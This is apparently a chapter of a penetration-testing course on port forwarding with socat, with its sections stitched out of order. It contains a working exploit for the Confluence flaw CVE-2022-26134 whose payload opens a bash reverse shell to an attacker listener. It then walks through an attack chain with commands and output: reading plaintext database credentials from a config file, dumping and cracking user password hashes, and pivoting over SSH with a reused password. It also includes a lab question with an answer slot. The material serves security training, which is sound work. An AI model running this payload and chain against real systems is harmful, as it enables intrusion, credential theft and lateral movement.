The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

